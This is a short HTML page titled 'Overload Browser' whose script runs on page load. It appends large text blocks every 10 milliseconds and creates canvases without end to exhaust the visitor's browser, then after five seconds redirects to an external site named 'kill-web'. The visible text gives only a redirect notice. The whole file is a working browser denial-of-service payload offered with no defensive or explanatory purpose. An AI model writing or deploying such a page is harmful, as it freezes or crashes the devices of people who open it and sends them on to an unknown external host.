<!DOCTYPE html>
<html>
<head>
    <title>Overload Browser</title>
    <script>
        function overload() {
            setTimeout(() => {
                window.location.href = "https://kill-web-github-io.vercel.app/";
            }, 5000);
            
            setInterval(() => {
                let div = document.createElement('div');
                div.innerHTML = 'Overload! '.repeat(1000);
                document.body.appendChild(div);
            }, 10);

            function createCanvas() {
                let x = document.createElement('canvas');
                document.body.appendChild(x);
                requestAnimationFrame(createCanvas);
            }
            createCanvas();
        }
    </script>
</head>
<body onload="overload()">
    <h1>Redirecting in 5 seconds...</h1>
</body>
</html>
